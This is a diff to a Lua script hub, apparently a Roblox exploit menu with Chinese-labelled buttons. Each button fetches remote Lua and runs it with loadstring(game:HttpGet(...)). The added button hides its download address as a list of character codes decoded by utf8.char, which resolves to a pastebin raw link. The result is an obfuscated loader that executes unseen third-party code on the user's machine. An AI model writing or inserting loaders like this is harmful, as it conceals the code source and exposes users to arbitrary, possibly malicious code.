@@ -1502,6 +1502,11 @@ tool:Button("星火交辉 x Script",function()
 loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/9319/%E6%98%9F%E7%81%AB%E4%BA%A4%E8%BE%89%E8%84%9A%E6%9C%AC%E6%BA%90%E7%A0%81.lua?sign=pw1GHDb-tSJH25rTcTo_QPhzJBe73nf7djKDL1vQN1M%3D%3A0"))()
 end)
 
+tool:Button("青风脚本 x Script",function()
+name = "青风脚本"
+loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,52,81,74,109,75,50,99,72})end)())))();
+end)
+
 local creds = window:Tab("音乐",'6035145364')
 
 local tool = creds:section("点一下就行",true)
